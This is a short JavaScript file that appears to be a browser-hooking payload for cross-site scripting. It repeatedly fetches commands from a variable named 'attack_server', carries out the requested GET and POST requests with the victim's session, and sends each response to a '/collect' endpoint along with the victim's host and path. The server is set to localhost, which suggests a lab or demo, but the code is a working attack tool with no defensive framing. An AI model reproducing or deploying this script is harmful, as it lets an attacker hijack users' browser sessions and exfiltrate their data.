(function() {

    // destination
    var attack_server = 'http://localhost:5000/'
    var session = (Math.random()+"").substring(2);
    session = 'foobar';

    var ajax = function(method, url, data, callback) {
        console.log('performing', method, 'to', url);
        var xhr = new XMLHttpRequest();
        xhr.open(method, url, true);
        xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
        xhr.onreadystatechange = function() {
            if (xhr.readyState == 4) {
                if (callback) {
                    callback(xhr.responseText);
                }
            }
        }
        if (data) {
            xhr.send(data);
        } else {
            xhr.send();
        }
    }

    var executeCommands = function(commands_string) {
        var commands = JSON.parse(commands_string);
        for (var i = 0; i < commands.length; i++) {
            var command = commands[i];
            console.log('Executing command ', command);
            if (command['method'] == 'GET' || command['method'] == 'POST') {
                console.log('performing', command['method'], 'command');
                ajax(
                    command['method'],
                    command['uri'],
                    command['data'],
                    function(data) {
                        ajax(
                            'POST',
                            attack_server + 'collect',
                            'host='+encodeURIComponent(window.location.protocol + '//' + window.location.host)+
                                '&uri='+encodeURIComponent((location.pathname+location.search).substr(1))+
                                '&session='+encodeURIComponent(session)+
                                '&payload=' + encodeURIComponent(data));
                    });
            }
        }
        // done? get the next batch
        getCommands();
    }

    var getCommands = function() {
        ajax('GET', attack_server + 'getnext/' + session, false, executeCommands);
    }

    getCommands();

})();